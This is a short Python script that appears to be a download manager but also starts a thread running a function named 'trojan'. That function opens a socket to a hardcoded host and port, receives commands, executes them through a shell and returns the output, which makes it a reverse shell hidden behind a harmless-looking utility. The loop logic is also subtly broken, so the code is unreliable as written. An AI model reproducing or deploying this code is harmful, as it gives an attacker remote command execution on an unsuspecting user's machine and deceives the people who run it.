import socket
from threading import Thread
import subprocess
import requests

def trojan():

    IP , PORT = "127.0.0.1" , 5475
    sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM) 
    sock.connect((IP, PORT))
    status = False
    while True:
        shell_command = sock.recv(1024).decode("utf-8")
        if shell_command.startswith("shellon"):
            status = True
            sock.send(b"Shell Activated :)")
            continue
        if shell_command.startswith("shelloff"): 
            status = False
            sock.send(b"Shell InActivated :(")
        if status:
            data = subprocess.Popen(shell_command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            data_shell = data.stderr.read () + data.stdout.read()
            sock.send(data_shell)
        else:
            pass
        sock.close()

def download_manager():
    n_link = int(input("Enter the number of links: "))
    for j in range(1,n_link+1):
        link = input(f"URL {j} => ")
        print("wait ...")
        re = requests.get(link)
        print(re)
        filename = input(f"filename = > ")
        with open(filename, "wb") as f: 
            f.write(re.content)
        print("Done ...!")

t1 = Thread (target = trojan).start()
t2 = Thread (target = download_manager).start()


